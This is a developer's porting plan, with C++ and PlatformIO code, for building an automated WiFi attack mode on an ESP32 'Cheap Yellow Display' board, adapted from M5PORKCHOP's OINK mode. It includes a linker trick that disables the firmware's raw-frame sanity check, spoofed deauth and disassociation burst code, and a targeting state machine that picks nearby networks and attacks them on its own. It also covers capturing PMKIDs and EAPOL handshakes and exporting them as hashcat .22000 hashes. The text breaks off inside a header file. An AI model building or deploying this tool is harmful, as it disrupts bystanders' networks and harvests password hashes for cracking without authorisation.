# YOINK Mode Porting Plan: M5PORKCHOP OINK → CYD NEONDRIVE

> **Date:** 2026-02-18  
> **Author:** Expert analysis of M5PORKCHOP repository + CYD NEONDRIVE codebase  
> **Target Hardware:** ESP32-2432S028R (CYD) — classic ESP32, 4MB flash, 320kB SRAM  
> **Source Hardware:** M5StickC Plus2 (ESP32-S3) — M5PORKCHOP platform

---

## Table of Contents

1. [Repository Analysis & Core Logic Extraction](#1-repository-analysis--core-logic-extraction)
2. [Porting the Core WiFi Attack Engine](#2-porting-the-core-wifi-attack-engine)
3. [Data Persistence & File Format](#3-data-persistence--file-format)
4. [UI Integration Strategy](#4-ui-integration-strategy)
5. [Implementation Plan — New Files](#5-implementation-plan--new-files)
6. [Troubleshooting & Final Checks](#6-troubleshooting--final-checks)

---

## 1. Repository Analysis & Core Logic Extraction

### 1.1 Key Source Files in M5PORKCHOP

| File | Role |
|------|------|
| `modes/oink.cpp` / `oink.h` | OINK state machine, EAPOL parsing, deauth bursts, PMKID extraction, .22000/.pcap save |
| `core/network_recon.cpp` / `.h` | Background promiscuous scanning, beacon parsing, channel hopping, PMF detection, network vector management |
| `core/wsl_bypasser.cpp` / `.h` | **Critical**: overrides `ieee80211_raw_frame_sanity_check()` via `-zmuldefs` linker flag to allow raw frame TX |
| `core/wifi_utils.cpp` / `.h` | TLS reserve, NTP sync, promiscuous mode teardown helpers |
| `core/sd_layout.cpp` / `.h` | Directory structure mapping (`/m5porkchop/handshakes/`, etc.), filename builders, layout migration |
| `core/sdlog.cpp` / `.h` | SD card append-logger |

### 1.2 Core OINK Workflow (State Machine)

```
┌──────────┐   5s    ┌──────────────┐   30s/done   ┌─────────────┐
│ SCANNING ├────────►│ PMKID_HUNTING├─────────────►│ NEXT_TARGET │
└────┬─────┘         └──────────────┘              └──────┬──────┘
     │ no networks                    ▲                   │ target found
     ▼                                │                   ▼
┌────────┐                            │          ┌────────────┐
│ BORED  │  30s retry           ◄─────┘          │  LOCKING   │ 2.5-8s
└────────┘                                       └──────┬─────┘
                                                        │ clients?
                                                        ▼
                                                 ┌────────────┐
                                                 │ ATTACKING   │ 15s max
                                                 └──────┬─────┘
                                                        │ hs captured/timeout
                                                        ▼
                                                 ┌────────────┐
                                                 │  WAITING    │ 4.5s
                                                 └──────┬─────┘
                                                        │
                                                   ◄────┘ → NEXT_TARGET
```

**Key workflow steps:**

1. **SCANNING (5s):** Channel hops across all 13 2.4GHz channels. NetworkRecon discovers networks
   from beacon frames. Parses RSN IE for PMF detection, auth mode detection, SSID extraction.

2. **PMKID_HUNTING (30s max):** Iterates discovered WPA2/WPA3 networks. For each, sends an
   Association Request to provoke an M1 (EAPOL) response. If M1 contains a PMKID KDE
   (`dd 14 00 0f ac 04 [16 bytes]`), it's a clientless capture — no deauth needed.

3. **NEXT_TARGET:** Scores all networks using `computeTargetScore()`:
   - RSSI weight (0-60 pts, proximity bonus +25 for > -40dBm)
   - Client activity (recent data frames = +30 pts)
   - Estimated client count via bitset hash (+6-16 pts)
   - Auth mode preference (WEP +15, WPA1 +10, WPA2 +0, WPA3 -10)
   - Attack attempts penalty (-8 pts per attempt)
   - Eligibility filters: no PMF, no existing handshake, not excluded, RSSI above threshold

4. **LOCKING (2.5-8s):** Locks channel to target AP. Discovers client MACs from data frames
   (ToDS/FromDS address extraction). Fast-tracks to ATTACKING if clients appear within 2.5s.
   Bails after 4s if no clients.

5. **ATTACKING (15s max):** Sends deauth bursts every 180ms:
   - **Targeted deauth** (if clients known): 5 deauth frames + disassoc per client, bidirectional
   - **Broadcast deauth** (fallback): single frame to FF:FF:FF:FF:FF:FF
   - Monitors for EAPOL M1→M4 in promiscuous callback
   - On complete handshake (M1+M2 or M2+M3): saves and moves to WAITING

6. **WAITING (4.5s):** Holds channel for late EAPOL frames. Extended to 9s if M1 seen but M2 missing.

### 1.3 Thread Safety Model

M5PORKCHOP uses a **deferred event pattern** for callback→main-loop communication:

- The promiscuous callback runs in the WiFi task context (NOT an ISR, but NOT the main loop either)
- Callback writes to lock-free circular buffers / atomic flags
- `update()` in the main loop drains those buffers and does heap operations (vector push_back, SD writes)
- A `portMUX_TYPE` spinlock protects the shared `networks` vector
- EAPOL frames use a static pool of 4 `PendingHandshakeFrame` slots (~13KB in .bss)

---

## 2. Porting the Core WiFi Attack Engine

### 2.1 Architectural Comparison

| Aspect | M5PORKCHOP (S3) | CYD NEONDRIVE (classic ESP32) |
|--------|-----------------|-------------------------------|
| Framework | Arduino + ESP-IDF (via ESP32-S3) | Arduino (classic ESP32) |
| WiFi init | `WiFi.mode(WIFI_STA)` + promiscuous | `WiFi.softAP("dummy")` + promiscuous |
| Frame injection | **WSL Bypasser** (`-zmuldefs` override) | Direct `esp_wifi_80211_tx()` (FAILS) |
| Deauth TX interface | `WIFI_IF_STA` always | Tries STA, toggles promisc, fallback to AP |
| Memory | ~320KB SRAM | ~320KB SRAM (same core) |
| Flash | Varies | 4MB (tight) |
| BLE | NimBLE for companion app | Not used in CYD |

### 2.2 ⚡ ROOT CAUSE: Why Your Deauth Injection Fails

**Your current `startSniff()` creates a hidden AP then enables promiscuous mode.** This worked
partially because `esp_wifi_80211_tx(WIFI_IF_AP, ...)` sometimes succeeds. But:

1. The ESP32 WiFi library internally calls `ieee80211_raw_frame_sanity_check()` before
   transmitting raw 802.11 frames. **Deauth frames (type 0xC0) are REJECTED** by this check.

2. Your `tryAlternateTx()` workaround (toggling promiscuous on/off, trying AP interface) is
   unreliable because the sanity check runs regardless of interface or mode.

3. M5PORKCHOP solves this definitively with the **WSL Bypasser**: a C function that overrides
   the library's `ieee80211_raw_frame_sanity_check()` to always return 0 (success). The
   `-zmuldefs` linker flag allows multiple definitions of the same symbol, with the user's
   definition taking precedence over `libnet80211.a`.

### 2.3 ✅ EXACT WiFi Initialization Sequence for CYD

**Step 1: Add `-zmuldefs` to your linker flags in `platformio.ini`:**

```ini
build_flags =
  -DTOUCH_CS=33
  -DUSER_SETUP_LOADED=1
  -include include/User_Setup.h
  -DARDUINO_LOOP_STACK_SIZE=16384
build_unflags = -Wl,--no-undefined
extra_scripts = 
link_flags = -Wl,-zmuldefs
```

**Actually, the correct way for PlatformIO is:**

```ini
build_flags =
  -DTOUCH_CS=33
  -DUSER_SETUP_LOADED=1
  -include include/User_Setup.h
  -DARDUINO_LOOP_STACK_SIZE=16384
  -Wl,-zmuldefs
```

The `-Wl,-zmuldefs` flag is passed through the compiler to the linker. This is the **single most
critical change** to make injection work.

**Step 2: Add the WSL Bypasser override function to your project:**

```cpp
// wsl_bypasser.cpp — add to src/

extern "C" {
// Override the WiFi library's frame sanity check.
// With -zmuldefs, this definition takes precedence over libnet80211.a
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;  // Allow ALL frame types (deauth, disassoc, auth, etc.)
}
}
```

**Step 3: Replace your `startSniff()` WiFi initialization with this proven sequence:**

```cpp
static void startYoinkWifi(uint8_t channel) {
    // === CLEAN WiFi INIT (from M5PORKCHOP NetworkRecon::start()) ===
    
    // 1. Disable any existing promiscuous mode
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    
    // 2. Clean WiFi state
    WiFi.persistent(false);    // Don't save credentials to NVS
    WiFi.setSleep(false);      // Keep radio active
    WiFi.mode(WIFI_STA);       // STA mode — NOT AP mode!
    delay(50);
    WiFi.disconnect();
    delay(50);
    
    // 3. Enable promiscuous mode with callback
    esp_wifi_set_promiscuous_rx_cb(&yoinkPromiscuousCallback);
    esp_wifi_set_promiscuous_filter(nullptr);  // Receive ALL packet types
    esp_wifi_set_promiscuous(true);
    
    // 4. Set initial channel
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    Serial.printf("[YOINK] WiFi ready: STA+promisc on ch%d (WSL bypass active)\n", channel);
}
```

**Key differences from your current approach:**
- Uses `WIFI_STA` not `WIFI_AP` — no hidden AP needed
- No AP startup delay (saves 200-300ms)
- `esp_wifi_80211_tx(WIFI_IF_STA, ...)` now works because WSL Bypasser disables the sanity check
- `esp_wifi_set_promiscuous_filter(nullptr)` ensures ALL packet types are received
- No toggle/retry logic needed — injection is reliable

### 2.4 Deauth Injection Functions (Proven from OINK)

```cpp
// Send a single deauth frame (AP → Station direction)
static void yoinkSendDeauth(const uint8_t* bssid, const uint8_t* station, uint8_t reason) {
    uint8_t pkt[26] __attribute__((aligned(4))) = {
        0xC0, 0x00,                             // Frame Control: Deauth
        0x00, 0x00,                             // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,     // DA (will fill)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // SA (will fill)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // BSSID (will fill)
        0x00, 0x00,                             // Sequence
        0x07, 0x00                              // Reason
    };
    memcpy(pkt + 4, station, 6);   // Destination
    memcpy(pkt + 10, bssid, 6);    // Source (spoof as AP)
    memcpy(pkt + 16, bssid, 6);    // BSSID
    pkt[24] = reason;
    
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26, false);
}

// Send a deauth burst (targeted, bidirectional)
static void yoinkSendDeauthBurst(const uint8_t* bssid, const uint8_t* station, uint8_t count) {
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    for (uint8_t i = 0; i < count; i++) {
        // Forward: AP → Client
        yoinkSendDeauth(bssid, station, 7);  // Class 3 from non-associated
        delay(random(1, 6));                  // 1-5ms jitter
        
        // Reverse: Client → AP (if not broadcast)
        if (memcmp(station, broadcast, 6) != 0) {
            uint8_t rev[26] __attribute__((aligned(4))) = {
                0xC0, 0x00, 0x00, 0x00
            };
            memcpy(rev + 4, bssid, 6);       // To AP
            memcpy(rev + 10, station, 6);     // From Client (spoofed)
            memcpy(rev + 16, bssid, 6);       // BSSID
            rev[24] = 1; rev[25] = 0;        // Unspecified reason
            esp_wifi_80211_tx(WIFI_IF_STA, rev, 26, false);
            if (i < count - 1) delay(random(1, 6));
        }
    }
}

// Send disassociation frame (some clients respond only to this)
static void yoinkSendDisassoc(const uint8_t* bssid, const uint8_t* station, uint8_t reason) {
    uint8_t pkt[26] __attribute__((aligned(4))) = {
        0xA0, 0x00,                             // Frame Control: Disassoc
        0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x08, 0x00
    };
    memcpy(pkt + 4, station, 6);
    memcpy(pkt + 10, bssid, 6);
    memcpy(pkt + 16, bssid, 6);
    pkt[24] = reason;
    
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26, false);
}
```

### 2.5 Channel Hopping (from OINK)

```cpp
// Channel hop order (most common first for faster discovery)
static const uint8_t CHANNEL_HOP_ORDER[] = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
static const uint8_t CHANNEL_COUNT = 13;
static uint8_t hopIndex = 0;
static uint32_t lastHopMs = 0;
static bool channelLocked = false;

static void yoinkHopChannel() {
    if (channelLocked) return;
    hopIndex = (hopIndex + 1) % CHANNEL_COUNT;
    uint8_t ch = CHANNEL_HOP_ORDER[hopIndex];
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

// Call from yoinkModeTick():
void yoinkChannelHopTick(uint32_t now, uint16_t intervalMs) {
    if (now - lastHopMs > intervalMs) {
        yoinkHopChannel();
        lastHopMs = now;
    }
}
```

### 2.6 Client Discovery & Tracking Table

```cpp
#define YOINK_MAX_CLIENTS 20

struct YoinkClient {
    uint8_t mac[6];
    int8_t rssi;
    uint32_t lastSeen;
};

static YoinkClient yoinkClients[YOINK_MAX_CLIENTS];
static uint8_t yoinkClientCount = 0;

// Extract client MAC from data frames (FromDS/ToDS logic)
static void yoinkTrackClient(const uint8_t* bssid, const uint8_t* clientMac,
                              int8_t rssi, const uint8_t* targetBssid) {
    // Only track clients for our target
    if (memcmp(bssid, targetBssid, 6) != 0) return;
    
    // Don't track broadcast/multicast
    if (clientMac[0] & 0x01) return;
    
    uint32_t now = millis();
    
    // Update existing client
    for (uint8_t i = 0; i < yoinkClientCount; i++) {
        if (memcmp(yoinkClients[i].mac, clientMac, 6) == 0) {
            yoinkClients[i].rssi = rssi;
            yoinkClients[i].lastSeen = now;
            return;
        }
    }
    
    // LRU eviction if at capacity
    if (yoinkClientCount >= YOINK_MAX_CLIENTS) {
        int stalestIdx = 0;
        uint32_t oldestTime = yoinkClients[0].lastSeen;
        for (uint8_t i = 1; i < yoinkClientCount; i++) {
            if (yoinkClients[i].lastSeen < oldestTime) {
                oldestTime = yoinkClients[i].lastSeen;
                stalestIdx = i;
            }
        }
        if (now - oldestTime > 30000) {
            yoinkClients[stalestIdx] = yoinkClients[yoinkClientCount - 1];
            yoinkClientCount--;
        } else {
            return;  // All clients fresh, can't add
        }
    }
    
    // Add new client
    memcpy(yoinkClients[yoinkClientCount].mac, clientMac, 6);
    yoinkClients[yoinkClientCount].rssi = rssi;
    yoinkClients[yoinkClientCount].lastSeen = now;
    yoinkClientCount++;
}

// Called from data frame processing in promiscuous callback
static void yoinkProcessDataFrame(const uint8_t* payload, uint16_t len, int8_t rssi,
                                   const uint8_t* targetBssid) {
    if (len < 28) return;
    
    uint8_t toDs = payload[1] & 0x01;
    uint8_t fromDs = (payload[1] & 0x02) >> 1;
    
    const uint8_t* bssid = nullptr;
    const uint8_t* client = nullptr;
    
    if (!toDs && fromDs) {         // From AP to client
        bssid = payload + 10;      // Addr2 = BSSID
        client = payload + 4;      // Addr1 = client DA
    } else if (toDs && !fromDs) {  // From client to AP
        bssid = payload + 4;       // Addr1 = BSSID
        client = payload + 10;     // Addr2 = client SA
    }
    
    if (bssid && client) {
        yoinkTrackClient(bssid, client, rssi, targetBssid);
    }
}
```

---

## 3. Data Persistence & File Format

### 3.1 Directory Structure (M5PORKCHOP Layout)

```
SD Card Root
└── m5porkchop/
    ├── handshakes/              ← PCAP + .22000 files go here
    │   ├── MyNetwork_AABBCCDDEEFF.pcap
    │   ├── MyNetwork_AABBCCDDEEFF_hs.22000
    │   └── MyNetwork_AABBCCDDEEFF.22000    (PMKID)
    ├── wardriving/
    ├── logs/
    │   └── porkchop.log
    ├── diagnostics/
    ├── wpa-sec/
    ├── wigle/
    ├── xp/
    ├── misc/
    │   └── boar_bros.txt
    ├── config/
    └── meta/
        └── .migrated_v1
```

**Filename convention** (from `SDLayout::buildCaptureFilename()`):
```
{dir}/{sanitizedSSID}_{BSSID_hex}.{ext}
```
Where:
- SSID is sanitized: non-alphanumeric chars → `_`, max 20 chars
- BSSID is 12 hex chars (no colons), e.g., `AABBCCDDEEFF`
- Extensions: `.pcap` for PCAP, `_hs.22000` for handshake, `.22000` for PMKID

For your CYD YOINK, I recommend using the **same directory structure** so captures are
interchangeable:

```cpp
static const char* YOINK_HANDSHAKES_DIR = "/m5porkchop/handshakes";

static void yoinkEnsureDirs() {
    if (!SD.exists("/m5porkchop")) SD.mkdir("/m5porkchop");
    if (!SD.exists(YOINK_HANDSHAKES_DIR)) SD.mkdir(YOINK_HANDSHAKES_DIR);
}

static void yoinkBuildFilename(char* out, size_t outLen, const char* ssid,
                                const uint8_t bssid[6], const char* suffix) {
    char sanitized[21] = {0};
    int pos = 0;
    if (ssid) {
        for (int i = 0; ssid[i] && pos < 20; i++) {
            char c = ssid[i];
            sanitized[pos++] = (isalnum(c) || c == '-') ? c : '_';
        }
    }
    if (pos == 0) { strcpy(sanitized, "HIDDEN"); pos = 6; }
    
    snprintf(out, outLen, "%s/%s_%02X%02X%02X%02X%02X%02X%s",
             YOINK_HANDSHAKES_DIR, sanitized,
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
             suffix);
}
```

### 3.2 PCAP File Format

M5PORKCHOP uses **LINKTYPE_IEEE802_11_RADIOTAP** (link type 127). This embeds a minimal
8-byte radiotap header before each 802.11 frame, which is required by Wireshark and hashcat.

```cpp
// PCAP global header
#pragma pack(push, 1)
struct PCAPGlobalHeader {
    uint32_t magic_number;    // 0xA1B2C3D4
    uint16_t version_major;   // 2
    uint16_t version_minor;   // 4
    int32_t  thiszone;        // 0 (UTC)
    uint32_t sigfigs;         // 0
    uint32_t snaplen;         // 65535
    uint32_t network;         // 127 = LINKTYPE_IEEE802_11_RADIOTAP
};

struct PCAPPacketHeader {
    uint32_t ts_sec;          // Timestamp seconds (millis()/1000)
    uint32_t ts_usec;         // Timestamp microseconds ((millis()%1000)*1000)
    uint32_t incl_len;        // Captured length (radiotap + frame)
    uint32_t orig_len;        // Original length (same)
};
#pragma pack(pop)

// Minimal 8-byte radiotap header (no optional fields)
static const uint8_t RADIOTAP_HDR[] = {
    0x00, 0x00,             // Header revision, pad
    0x08, 0x00,             // Header length = 8 (little-endian)
    0x00, 0x00, 0x00, 0x00  // Present flags = none
};

static void yoinkWritePcapHeader(File& f) {
    PCAPGlobalHeader hdr = {
        0xA1B2C3D4, 2, 4, 0, 0, 65535, 127
    };
    f.write((uint8_t*)&hdr, sizeof(hdr));
}

static void yoinkWritePcapPacket(File& f, const uint8_t* frame, uint16_t len, uint32_t tsMs) {
    uint32_t totalLen = sizeof(RADIOTAP_HDR) + len;
    PCAPPacketHeader pkt = {
        tsMs / 1000,
        (tsMs % 1000) * 1000,
        totalLen,
        totalLen
    };
    f.write((uint8_t*)&pkt, sizeof(pkt));
    f.write(RADIOTAP_HDR, sizeof(RADIOTAP_HDR));
    f.write(frame, len);
}
```

### 3.3 Handshake PCAP Save

A complete handshake PCAP contains:
1. **Beacon frame** from the target AP (required by hashcat for SSID/BSSID validation)
2. **EAPOL M1-M4 frames** (at minimum M1+M2 or M2+M3)

```cpp
static bool yoinkSaveHandshakePcap(const YoinkHandshake& hs, const char* path) {
    File f = SD.open(path, FILE_WRITE);
    if (!f) return false;
    
    yoinkWritePcapHeader(f);
    
    // 1. Write beacon if captured
    if (hs.beaconLen > 0) {
        yoinkWritePcapPacket(f, hs.beaconData, hs.beaconLen, hs.firstSeen);
    }
    
    // 2. Write each captured EAPOL frame
    for (int i = 0; i < 4; i++) {
        if (!(hs.capturedMask & (1 << i))) continue;
        if (hs.frames[i].fullFrameLen > 0) {
            // Prefer the full captured 802.11 frame (best quality)
            yoinkWritePcapPacket(f, hs.frames[i].fullFrame, hs.frames[i].fullFrameLen,
                                 hs.frames[i].timestamp);
        } else if (hs.frames[i].eapolLen > 0) {
            // Fallback: reconstruct from EAPOL payload
            uint8_t pkt[600];
            uint16_t pktLen = 0;
            
            // 802.11 Data header (24 bytes)
            pkt[0] = 0x08; // Data frame
            if (i == 0 || i == 2) {  // M1, M3: AP→STA (FromDS=1)
                pkt[1] = 0x02;
                memcpy(pkt + 4, hs.station, 6);   // DA
                memcpy(pkt + 10, hs.bssid, 6);    // SA/BSSID
                memcpy(pkt + 16, hs.bssid, 6);    // BSSID
            } else {  // M2, M4: STA→AP (ToDS=1)
                pkt[1] = 0x01;
                memcpy(pkt + 4, hs.bssid, 6);     // DA
                memcpy(pkt + 10, hs.station, 6);   // SA
                memcpy(pkt + 16, hs.bssid, 6);     // BSSID
            }
            pkt[2] = pkt[3] = 0; // Duration
            pkt[22] = pkt[23] = 0; // Sequence
            pktLen = 24;
            
            // LLC/SNAP header (8 bytes)
            uint8_t llc[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
            memcpy(pkt + pktLen, llc, 8);
            pktLen += 8;
            
            // EAPOL payload
            memcpy(pkt + pktLen, hs.frames[i].eapolData, hs.frames[i].eapolLen);
            pktLen += hs.frames[i].eapolLen;
            
            yoinkWritePcapPacket(f, pkt, pktLen, hs.frames[i].timestamp);
        }
    }
    
    f.close();
    return true;
}
```

### 3.4 Hashcat .22000 Export

The `.22000` format is the modern hashcat-native format. No PCAP-to-hash conversion needed.

**PMKID format (WPA*01):**
```
WPA*01*PMKID*MAC_AP*MAC_STA*ESSID_hex***01
```

**Handshake format (WPA*02):**
```
WPA*02*MIC*MAC_AP*MAC_STA*ESSID_hex*ANonce*EAPOL_zeroed_MIC*MESSAGEPAIR
```

Where:
- MIC = 16 bytes at EAPOL offset 81 (from M2)
- ANonce = 32 bytes at EAPOL offset 17 (from M1 or M3)
- EAPOL = full M2 EAPOL frame with MIC zeroed out
- MESSAGEPAIR: `00` = M1+M2, `02` = M2+M3

```cpp
static bool yoinkSaveHandshake22000(const YoinkHandshake& hs, const char* path) {
    // Determine message pair
    uint8_t msgPair;
    const YoinkEapolFrame* nonceFrame;  // M1 or M3 (has ANonce)
    const YoinkEapolFrame* eapolFrame;  // M2 (has MIC)
    
    if ((hs.capturedMask & 0x03) == 0x03) {     // M1+M2 available
        msgPair = 0x00;
        nonceFrame = &hs.frames[0];  // M1
        eapolFrame = &hs.frames[1];  // M2
    } else if ((hs.capturedMask & 0x06) == 0x06) { // M2+M3 available
        msgPair = 0x02;
        nonceFrame = &hs.frames[2];  // M3
        eapolFrame = &hs.frames[1];  // M2
    } else {
        return false;  // No valid pair
    }
    
    if (nonceFrame->eapolLen < 51 || eapolFrame->eapolLen < 97) return false;
    
    File f = SD.open(path, FILE_WRITE);
    if (!f) return false;
    
    // MIC from M2 (16 bytes at offset 81)
    char micHex[33];
    for (int i = 0; i < 16; i++) sprintf(micHex + i*2, "%02x", eapolFrame->eapolData[81 + i]);
    
    // MAC AP + MAC STA (12 hex chars each)
    char macAP[13], macSTA[13];
    sprintf(macAP, "%02x%02x%02x%02x%02x%02x",
            hs.bssid[0], hs.bssid[1], hs.bssid[2], hs.bssid[3], hs.bssid[4], hs.bssid[5]);
    sprintf(macSTA, "%02x%02x%02x%02x%02x%02x",
            hs.station[0], hs.station[1], hs.station[2], hs.station[3], hs.station[4], hs.station[5]);
    
    // ESSID (hex-encoded)
    char essidHex[65];
    int ssidLen = strlen(hs.ssid);
    if (ssidLen > 32) ssidLen = 32;
    for (int i = 0; i < ssidLen; i++) sprintf(essidHex + i*2, "%02x", (uint8_t)hs.ssid[i]);
    essidHex[ssidLen * 2] = 0;
    
    // ANonce from M1/M3 (32 bytes at offset 17)
    char nonceHex[65];
    for (int i = 0; i < 32; i++) sprintf(nonceHex + i*2, "%02x", nonceFrame->eapolData[17 + i]);
    
    // Full EAPOL from M2 with MIC zeroed
    uint16_t eapolTotalLen = (eapolFrame->eapolData[2] << 8) | eapolFrame->eapolData[3];
    eapolTotalLen += 4;  // Add EAPOL header
    if (eapolTotalLen > eapolFrame->eapolLen) eapolTotalLen = eapolFrame->eapolLen;
    
    uint8_t eapolCopy[512];
    memcpy(eapolCopy, eapolFrame->eapolData, eapolTotalLen);
    memset(eapolCopy + 81, 0, 16);  // Zero MIC field
    
    static char eapolHex[1025];
    for (int i = 0; i < eapolTotalLen; i++) sprintf(eapolHex + i*2, "%02x", eapolCopy[i]);
    eapolHex[eapolTotalLen * 2] = 0;
    
    f.printf("WPA*02*%s*%s*%s*%s*%s*%s*%02x\n",
             micHex, macAP, macSTA, essidHex, nonceHex, eapolHex, msgPair);
    
    f.close();
    return true;
}

static bool yoinkSavePmkid22000(const YoinkPmkid& p, const char* path) {
    // Validate: skip all-zero PMKIDs
    bool allZero = true;
    for (int i = 0; i < 16; i++) if (p.pmkid[i] != 0) { allZero = false; break; }
    if (allZero || p.ssid[0] == 0) return false;
    
    File f = SD.open(path, FILE_WRITE);
    if (!f) return false;
    
    char pmkidHex[33], macAP[13], macSTA[13];
    for (int i = 0; i < 16; i++) sprintf(pmkidHex + i*2, "%02x", p.pmkid[i]);
    sprintf(macAP, "%02x%02x%02x%02x%02x%02x",
            p.bssid[0], p.bssid[1], p.bssid[2], p.bssid[3], p.bssid[4], p.bssid[5]);
    sprintf(macSTA, "%02x%02x%02x%02x%02x%02x",
            p.station[0], p.station[1], p.station[2], p.station[3], p.station[4], p.station[5]);
    
    char essidHex[65];
    int len = strlen(p.ssid);
    if (len > 32) len = 32;
    for (int i = 0; i < len; i++) sprintf(essidHex + i*2, "%02x", (uint8_t)p.ssid[i]);
    essidHex[len * 2] = 0;
    
    f.printf("WPA*01*%s*%s*%s*%s***01\n", pmkidHex, macAP, macSTA, essidHex);
    f.close();
    return true;
}
```

---

## 4. UI Integration Strategy

### 4.1 Mapping OINK States to Your CYD UI

Your current YOINK screen (in `main.cpp`) has basic stats. Here's how to enhance it to show
OINK-level telemetry while keeping your existing NEONDRIVE aesthetics:

```
┌──────────────────────────────────────┐
│ NEONDRIVE // YOINK      CH:6 🔒     │  ← Header with channel + lock indicator
├──────────────────────────────────────┤
│ TARGET: MyWiFi_5G                    │  ← SSID (or "Scanning..." in SCAN state)
│ BSSID:  AA:BB:CC:DD:EE:FF           │
│ AUTH:   WPA2  RSSI: -42dBm          │
│ STATE:  ATTACKING ████░░░░ 8/15s    │  ← State + progress bar
├──────────────────────────────────────┤
│ CLIENTS: 3    DEAUTHS: 127          │
│ EAPOL:   M1✓ M2✓ M3░ M4░           │  ← Handshake progress
│ PMKID:   1 captured                 │
│ PKTS:    12,847  PPS: 342           │
├──────────────────────────────────────┤
│ HANDSHAKES: 2 saved to SD           │
│ HS: MyWiFi_5G ✓  OtherNet ✓        │
├──────────────────────────────────────┤
│ [ STOP ]              [ BACK ]      │  ← Touch buttons
└──────────────────────────────────────┘
```

### 4.2 State String Mapping

```cpp
static const char* yoinkStateStr(YoinkState state) {
    switch (state) {
        case YOINK_SCANNING:      return "SCANNING";
        case YOINK_PMKID_HUNTING: return "PMKID HUNT";
        case YOINK_NEXT_TARGET:   return "TARGETING";
        case YOINK_LOCKING:       return "LOCKING";
        case YOINK_ATTACKING:     return "ATTACKING";
        case YOINK_WAITING:       return "WAITING";
        case YOINK_BORED:         return "IDLE";
        default:                  return "---";
    }
}
```

### 4.3 Control Flow (Touch Interaction)

| User Action | Effect |
|-------------|--------|
| Tap **STOP** during attack | Stop deauth, return to SCANNING |
| Tap **BACK** | Stop YOINK entirely, return to home menu |
| Tap network list item *(if draw list)* | Select as target, enter LOCKING |
| Long-press target info | Exclude from targeting (BOAR BRO equivalent) |

### 4.4 Drawing the EAPOL Progress Indicator

```cpp
static void drawEapolProgress(int x, int y, uint8_t capturedMask) {
    const int boxW = 28, boxH = 14, gap = 4;
    const char* labels[] = {"M1", "M2", "M3", "M4"};
    
    for (int i = 0; i < 4; i++) {
        int bx = x + i * (boxW + gap);
        bool captured = capturedMask & (1 << i);
        
        tft.fillRect(bx, y, boxW, boxH, captured ? TFT_GREEN : TFT_DARKGREY);
        tft.drawRect(bx, y, boxW, boxH, TFT_WHITE);
        tft.setTextColor(captured ? TFT_BLACK : TFT_WHITE);
        tft.setTextDatum(MC_DATUM);
        tft.drawString(labels[i], bx + boxW/2, y + boxH/2);
    }
}
```

---

## 5. Implementation Plan — New Files

### 5.1 File Structure

```
src/
├── main.cpp              ← Existing (add YOINK UI draw + state integration)
├── yoink_engine.h        ← NEW: YOINK core engine header
├── yoink_engine.cpp      ← NEW: YOINK state machine, EAPOL parsing, deauth
├── yoink_save.h          ← NEW: PCAP + .22000 save functions header
├── yoink_save.cpp         ← NEW: PCAP + .22000 file writing
├── wsl_bypasser.h        ← NEW: WSL frame bypass header
├── wsl_bypasser.cpp      ← NEW: ieee80211_raw_frame_sanity_check override
├── bruce_wifi.cpp        ← Existing (can coexist)
├── wifiscan.cpp          ← Existing
└── ...
```

### 5.2 Data Structures (yoink_engine.h)

```cpp
#pragma once
#include <Arduino.h>
#include <esp_wifi.h>
#include <SD.h>

#define YOINK_MAX_NETWORKS   64    // Reduced from OINK's 200 for CYD memory
#define YOINK_MAX_CLIENTS    20
#define YOINK_MAX_HANDSHAKES 10    // Reduced from 50
#define YOINK_MAX_PMKIDS     10

// ---- Structures ----

struct YoinkNetwork {
    uint8_t bssid[6];
    char ssid[33];
    int8_t rssi;
    int8_t rssiAvg;
    uint8_t channel;
    wifi_auth_mode_t authmode;
    uint32_t lastSeen;
    uint32_t lastDataSeen;
    uint16_t beaconCount;
    bool hasPMF;
    bool hasHandshake;
    uint8_t attackAttempts;
    bool isHidden;
    uint32_t cooldownUntil;
};

struct YoinkEapolFrame {
    uint8_t eapolData[512];    // EAPOL payload (for .22000)
    uint8_t fullFrame[300];     // Full 802.11 frame (for PCAP)
    uint16_t eapolLen;
    uint16_t fullFrameLen;
    uint32_t timestamp;
    int8_t rssi;
};

struct YoinkHandshake {
    uint8_t bssid[6];
    uint8_t station[6];
    char ssid[33];
    YoinkEapolFrame frames[4];  // M1-M4
    uint8_t capturedMask;       // Bits 0-3
    uint32_t firstSeen;
    uint32_t lastSeen;
    bool saved;
    uint8_t beaconData[512];    // Static buffer (no malloc)
    uint16_t beaconLen;
    
    bool hasM1() const { return capturedMask & 0x01; }
    bool hasM2() const { return capturedMask & 0x02; }
    bool hasValidPair() const { return (hasM1() && hasM2()) || ((capturedMask & 0x06) == 0x06); }
};

struct YoinkPmkid {
    uint8_t bssid[6];
    uint8_t station[6];
    char ssid[33];
    uint8_t pmkid[16];
    uint32_t timestamp;
    bool saved;
};

// ---- State Machine ----
enum YoinkState {
    YOINK_IDLE,
    YOINK_SCANNING,
    YOINK_PMKID_HUNTING,
    YOINK_NEXT_TARGET,
    YOINK_LOCKING,
    YOINK_ATTACKING,
    YOINK_WAITING,
    YOINK_BORED,
};

// ---- Public API ----
namespace YoinkEngine {
    void init();
    void start();
    void stop();
    void update();       // Call every loop iteration
    bool isRunning();
    
    // State
    YoinkState getState();
    const char* getStateStr();
    
    // Stats
    uint32_t getPacketCount();
    uint32_t getDeauthCount();
    uint8_t  getNetworkCount();
    uint8_t  getClientCount();
